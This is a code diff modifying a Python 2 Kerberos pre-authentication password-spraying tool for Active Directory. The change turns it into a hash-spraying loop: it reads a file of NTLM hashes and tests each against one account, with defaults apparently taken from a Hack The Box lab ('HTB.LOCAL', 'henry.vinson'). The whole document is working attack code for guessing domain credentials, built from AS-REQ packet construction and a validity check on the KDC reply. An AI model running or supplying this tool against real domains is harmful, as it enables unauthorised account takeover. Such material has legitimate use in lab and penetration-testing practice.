@@ -1,5 +1,7 @@
-#!/usr/bin/python
+#!python2
+
 import sys, os
+
 import socket
 from random import getrandbits
 from time import time, localtime, strftime
@@ -10,11 +12,10 @@ from pyasn1.type.tag import Tag, tagClassContext, tagClassApplication, tagFormat
 from pyasn1.codec.der.encoder import encode
 from struct import pack, unpack
 from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
-from Crypto.Cipher import ARC4
-from Crypto.Cipher import MD4, MD5
+from Crypto.Cipher import ARC4, MD4, MD5
 from time import time, gmtime, strftime, strptime, localtime
 import hmac as HMAC
-from random import getrandbits, sample
+from random import sample
 
 RC4_HMAC = 23
 NT_PRINCIPAL = 1
@@ -200,14 +201,14 @@ def build_as_req(target_realm, user_name, key, current_time, nonce):
 def send_req_tcp(req, kdc, port=88):
     data = encode(req)
     data = pack('>I', len(data)) + data
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
     sock.connect((kdc, port))
     sock.send(data)
     return sock
 
 def send_req_udp(req, kdc, port=88):
     data = encode(req)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
     sock.connect((kdc, port))
     sock.send(data)
     return sock
@@ -265,6 +266,7 @@ def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
     for c in data:       
         i=i+1
         if(i==18):
+            print('Testing keys: %s:%s'%(user_name,orgin_key))
             if(ord(c)==0x0b):
                 print('[+] Valid Login: %s:%s'%(user_name,orgin_key))
 
@@ -286,56 +288,32 @@ def passwordspray_udp(user_realm, user_name, user_key, kdc_a, orgin_key):
    
 if __name__ == '__main__':
 
-    if len(sys.argv)!=7:
-        print('[!]Wrong parameter')
-        print('Use Kerberos pre-authentication to test a single password against a list of Active Directory accounts.')
-        print('Reference:')
-        print('  https://github.com/ropnop/kerbrute')
-        print('  https://github.com/mubix/pykek')
-        print('Author: 3gstudent')
-	print('Usage:')
-	print('	%s <domainControlerAddr> <domainName> <file> <passwordtype> <data> <mode>'%(sys.argv[0]))
-        print('<passwordtype>: clearpassword or ntlmhash')
-        print('<mode>: tcp or udp')
-	print('Eg.')
-	print('	%s 192.168.1.1 test.com user.txt clearpassword DomainUser123! tcp'%(sys.argv[0]))
-	print('	%s 192.168.1.1 test.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp'%(sys.argv[0]))
-	sys.exit(0)
-    else:
+    
+    if len(sys.argv) > 4:
         kdc_a = sys.argv[1]
-        user_realm = sys.argv[2].upper()
-        print('[*] DomainControlerAddr: %s'%(kdc_a))
-        print('[*] DomainName:          %s'%(user_realm))
-        print('[*] UserFile:            %s'%(sys.argv[3]))
+        user_realm = sys.argv[2]
+        username = sys.argv[3]
+        hashes_file_path = sys.argv[4]
+    else:
+        kdc_a = raw_input("Introduce kdc_a (default: APT): ") or 'APT'
+        user_realm = raw_input("Introduce user_realm (default: HTB.LOCAL): ") or 'HTB.LOCAL'
+        username = raw_input("Introduce username(defualt: henry.vinson): ") or 'henry.vinson'
+        hashes_file_path = raw_input("Introduce la ruta del archivo de hashes(default: hashes.txt): ") or '/home/gris/LazyOwn/sessions/hashes.txt'
 
-        
-        if sys.argv[4]=='clearpassword':
-            print('[*] ClearPassword:       %s'%(sys.argv[5]))
-            user_key = (RC4_HMAC, ntlm_hash(sys.argv[5]).digest())
-            
-        elif sys.argv[4]=='ntlmhash':
-            print('[*] NTLMHash:            %s'%(sys.argv[5]))
-            user_key = (RC4_HMAC, sys.argv[5].decode('hex'))
-            
-        else:
-            print('[!]Wrong parameter of <passwordtype>')
-            sys.exit(0)     
+    print("Argumentos recibidos:")
+    print("kdc_a:", kdc_a)
+    print("user_realm:", user_realm)
+    print("username:", username)
+    print("hashes_file_path:", hashes_file_path)
 
-        file_object = open(sys.argv[3], 'r')
+    hashes = open(hashes_file_path, 'r').readlines()
 
-        if sys.argv[6]=='tcp':
-            print('[*] Using TCP to test a single password against a list of Active Directory accounts.')
-            for line in file_object:
-                passwordspray_tcp(user_realm, line.strip('\r\n'), user_key, kdc_a, sys.argv[5])
-        elif sys.argv[6]=='udp':
-            print('[*] Using UDP to test a single password against a list of Active Directory accounts.')  
-            for line in file_object:
-                passwordspray_udp(user_realm, line.strip('\r\n'), user_key, kdc_a, sys.argv[5])
-        else:
-            print('[!]Wrong parameter of <mode>')
-            sys.exit(0)     
+    for ntlm in hashes:
+        try:
+            ntlm = ntlm.strip('\r\n')
 
-
-        print('All done.')
-        
-
+            user_key = (RC4_HMAC, ntlm.decode('hex'))
+            passwordspray_tcp(user_realm, username, user_key, kdc_a, ntlm)
+        except Exception as err:
+            print(ntlm)
+            print(str(err))
